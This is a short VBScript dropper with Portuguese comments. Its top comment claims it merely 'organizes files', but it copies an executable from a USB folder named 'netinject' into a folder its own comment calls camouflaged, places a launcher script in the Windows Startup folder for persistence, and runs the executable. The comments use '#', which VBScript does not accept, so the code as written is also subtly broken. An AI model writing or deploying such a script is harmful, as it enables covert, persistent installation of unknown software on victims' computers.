# Este script serve para organizar todos os arquivos nos seus devidos lugares.

# Cria variaveis para funcionamento dos comandos.
dim crt
dim stpath
set crt = CreateObject("wscript.shell")
set x = CreateObject("Scripting.FileSystemObject")
set exe = CreateObject("Shell.Application")

# Pega a localização da pasta de Startup da windows para que o programa execute sempre que o pc ligar.
stpath = crt.SpecialFolders("Startup")
stpath = Replace(stpath,"Startup","Startup\")

# Cria a pasta camuflada no C:/
crt.Run "cmd /c mkdir c:\SysFunctions\Functionx32"

WScript.Sleep(1000)

# Organiza os arquivos copiando e colando da pendrive para os seus devidos lugares
x.CopyFile "D:\netinject\App.exe", "C:\SysFunctions\Functionx32\"
x.CopyFile "D:\netinject\Appsaves.txt", "C:\SysFunctions\Functionx32\"
x.CopyFile "D:\netinject\start.vbs", "C:\SysFunctions\Functionx32\"
x.CopyFile "C:\SysFunctions\Functionx32\start.vbs", stpath

WScript.Sleep(1000)

# Executa o programa ao terminar de organizar.
exe.ShellExecute("C:\SysFunctions\Functionx32\App.exe")

# Made By Cheypz